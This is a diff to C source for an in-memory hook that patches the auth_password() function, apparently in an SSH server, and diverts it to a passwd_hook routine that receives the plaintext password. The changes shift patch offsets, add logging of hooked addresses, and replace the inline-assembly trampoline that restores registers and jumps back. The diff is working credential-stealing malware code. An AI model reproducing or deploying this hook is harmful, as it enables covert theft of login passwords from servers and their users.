@@ -55,7 +55,9 @@ int ret=0;
 	}
 
 	// Step back to the start of the function
-	ptr -= 17;
+	ptr -= 18;
+	snprintf(buffer, sizeof(buffer), "[!] auth_password %p\n", ptr);
+        write(log, buffer, strlen(buffer));
 
 	// Ptr should now point to the start of "auth_password()", so now we can add our hook
 	// We first need to update the protection of memory so we can write to this page
@@ -70,8 +72,9 @@ int ret=0;
 		return;
 	}
 
-	addr = ptr + 16;	// This puts us in place for the strlen call 
-
+	addr = ptr + 13;	// This puts us in place for the strlen call 
+	snprintf(buffer, sizeof(buffer), "[!] strlen %p\n", addr);
+	write(log, buffer, strlen(buffer));
 	// Patch our hook to jump to the "passwd_hook" function below
 	*(unsigned long long *)((char*)jmphook+2) = &passwd_hook;
 	memcpy(ptr, jmphook, sizeof(jmphook));
@@ -125,6 +128,18 @@ void passwd_hook(void *arg1, char *password) {
 	   );
 
 	// Now we replace the first 16 bytes of the original function
+	asm(
+	    "push %%r12\n"
+	    "push %%rbp\n"
+	    "mov %%rbp, %%rsi\n"
+	    "push %%rbx\n"
+	    "mov %%rbx, %%rdi\n"
+	    "mov %%rdi, %%rsi\n"
+	    "mov %0, %%rax\n"
+	    "jmp *%%rax\n"
+	// Finally, we jump back to the function
+	:: "r" (addr): "%rax");
+	/*// Now we replace the first 16 bytes of the original function
 	asm("push %%r13\n"
 	    "push %%r12\n"
 	    "push %%rbp\n"
@@ -135,5 +150,5 @@ void passwd_hook(void *arg1, char *password) {
 	    "mov %0, %%rax\n"
 	    "jmp *%%rax\n"
 	// Finally, we jump back to the function
-	:: "r" (addr): "%rax");
+	:: "r" (addr): "%rax");*/
 }
